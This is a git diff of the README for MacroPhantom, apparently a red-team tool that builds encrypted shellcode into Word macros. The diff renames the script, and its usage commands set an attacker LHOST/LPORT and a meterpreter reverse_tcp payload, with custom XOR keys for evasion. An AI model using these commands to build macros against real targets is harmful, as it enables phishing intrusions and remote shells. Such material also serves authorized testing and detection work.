@@ -49,11 +49,11 @@ MacroPhantom automates the process of generating XOR+Caesar encrypted shellcode 
 
 ```bash
 # Clone the repository
-git clone https://github.com/username/MacroPhantom.git
+git clone https://github.com/xbz0n/MacroPhantom.git
 cd MacroPhantom
 
 # Ensure the script is executable
-chmod +x VBS_Macro_Generator.py
+chmod +x MacroPhantom.py
 ```
 
 ## Usage
@@ -62,23 +62,23 @@ chmod +x VBS_Macro_Generator.py
 
 ```bash
 # Generate macros for modern Word versions (2010+)
-python3 VBS_Macro_Generator.py --LHOST 192.168.1.100 --LPORT 4444
+python3 MacroPhantom.py --LHOST 192.168.1.100 --LPORT 4444
 ```
 
 ### Advanced Options
 
 ```bash
 # Generate macros for legacy Word versions (2003-2007)
-python3 VBS_Macro_Generator.py --LHOST 192.168.1.100 --LPORT 4444 --legacy
+python3 MacroPhantom.py --LHOST 192.168.1.100 --LPORT 4444 --legacy
 
 # Use custom encoding keys
-python3 VBS_Macro_Generator.py --LHOST 192.168.1.100 --LPORT 4444 --xor-key 123 --add-key 5
+python3 MacroPhantom.py --LHOST 192.168.1.100 --LPORT 4444 --xor-key 123 --add-key 5
 
 # Use a different payload
-python3 VBS_Macro_Generator.py --LHOST 192.168.1.100 --LPORT 4444 --payload windows/meterpreter/reverse_tcp
+python3 MacroPhantom.py --LHOST 192.168.1.100 --LPORT 4444 --payload windows/meterpreter/reverse_tcp
 
 # Specify an output directory
-python3 VBS_Macro_Generator.py --LHOST 192.168.1.100 --LPORT 4444 --output-dir /path/to/output
+python3 MacroPhantom.py --LHOST 192.168.1.100 --LPORT 4444 --output-dir /path/to/output
 ```
 
 ## Command Line Options
